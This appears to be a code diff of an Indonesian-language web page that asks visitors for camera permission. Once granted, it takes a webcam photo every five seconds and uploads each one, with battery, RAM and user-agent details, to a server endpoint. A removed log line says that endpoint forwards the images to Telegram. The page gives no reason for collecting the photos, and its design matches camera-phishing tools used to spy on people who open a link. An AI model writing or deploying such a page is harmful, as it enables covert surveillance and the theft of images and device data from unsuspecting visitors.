@@ -1,11 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Halaman Izin Kamera</title>
     <style>
-      /* Styling agar tombol berada di tengah halaman */
       body {
         display: flex;
         justify-content: center;
@@ -25,49 +24,64 @@
     <button id="startButton">Klik untuk Meminta Izin Kamera</button>
 
     <script>
-      document.getElementById("startButton").onclick = async () => {
+      const startButton = document.getElementById("startButton");
+
+      startButton.onclick = async () => {
         try {
-          // Meminta izin untuk mengakses kamera
           const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const video = document.createElement('video');
+          const video = document.createElement("video");
           video.srcObject = stream;
           video.play();
 
-          // Setelah video dimulai, ambil foto setiap 5 detik
+          document.body.innerHTML = ""; // hilangkan tombol
+          document.body.appendChild(video);
+
+          // Ambil info baterai sekali aja
+          let batteryInfo = {
+            level: "Tidak diketahui",
+            charging: "Tidak diketahui"
+          };
+
+          if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            batteryInfo.level = battery.level * 100 + "%";
+            batteryInfo.charging = battery.charging ? "Ya" : "Tidak";
+          }
+
+          const ram = navigator.deviceMemory || "Tidak diketahui";
+
           setInterval(() => {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+
+            const ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
             const imageData = canvas.toDataURL("image/jpeg");
 
-            // Ambil informasi perangkat dan lokasi
             const deviceInfo = {
-              batteryLevel: navigator.getBattery ? await navigator.getBattery().then(battery => battery.level * 100) : 'Tidak diketahui',
-              isCharging: navigator.getBattery ? await navigator.getBattery().then(battery => battery.charging ? 'Ya' : 'Tidak') : 'Tidak diketahui',
-              ram: navigator.deviceMemory || 'Tidak diketahui',  // RAM dalam GB (Device Memory API)
-              usedStorage: window.localStorage.length,  // Penyimpanan yang digunakan (tidak akurat, hanya untuk contoh)
-              totalStorage: 'Tidak diketahui',  // Total storage (tidak akurat tanpa akses API khusus)
+              ram: ram + " GB",
+              batteryLevel: batteryInfo.level,
+              isCharging: batteryInfo.charging,
+              userAgent: navigator.userAgent
             };
 
-            // Kirim foto dan informasi ke API
-            fetch('/api/kirim', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
+            fetch("/api/kirim", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
               body: JSON.stringify({
                 image: imageData,
-                deviceInfo: deviceInfo
+                deviceInfo
               })
-            }).then(response => response.json())
-              .then(data => console.log('Gambar dikirim ke Telegram:', data))
-              .catch(err => console.error('Gagal mengirim gambar:', err));
-          }, 5000); // Kirim foto setiap 5 detik
+            }).then(res => res.json())
+              .then(data => console.log("Terkirim:", data))
+              .catch(err => console.error("Gagal kirim:", err));
+          }, 5000);
 
-          alert("Izin kamera diberikan! Kamera akan mulai aktif.");
-
-        } catch (error) {
-          alert("Izin kamera ditolak atau terjadi kesalahan.");
+          alert("Izin kamera berhasil. Mengambil foto setiap 5 detik.");
+        } catch (err) {
+          alert("Gagal akses kamera: " + err.message);
         }
       };
     </script>
